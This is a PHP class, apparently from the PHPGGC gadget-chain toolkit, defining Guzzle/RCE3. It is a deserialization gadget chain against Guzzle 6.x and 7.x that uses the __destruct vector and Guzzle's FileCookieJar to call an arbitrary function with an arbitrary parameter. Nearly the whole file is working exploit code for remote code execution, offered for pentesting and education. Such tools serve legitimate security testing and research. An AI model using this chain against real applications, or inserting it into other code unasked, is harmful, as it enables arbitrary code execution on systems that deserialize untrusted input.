<?php

namespace GadgetChain\Guzzle;

class RCE3 extends \PHPGGC\GadgetChain\RCE\FunctionCall
{
  public static $version = '6.x, 7.x';
  public static $vector = '__destruct';
  public static $author = 'mir-hossein (Mirhossein Rahmani)';
  public static $information = "This GC has been provided to demonstrate PHP-TPTW trick. Please use it only for educational purposes or legal pentest.\n" .
                               "This GC is the revived version of an obsolete GC. (Guzzle/RCE1 by Charles Fol and Rodrigo Nas).";

  public function generate(array $parameters)
  {
    $function = $parameters["function"];
    $parameter = $parameters["parameter"];
         
    return new \GuzzleHttp\Cookie\FileCookieJar($function, $parameter);
  }
}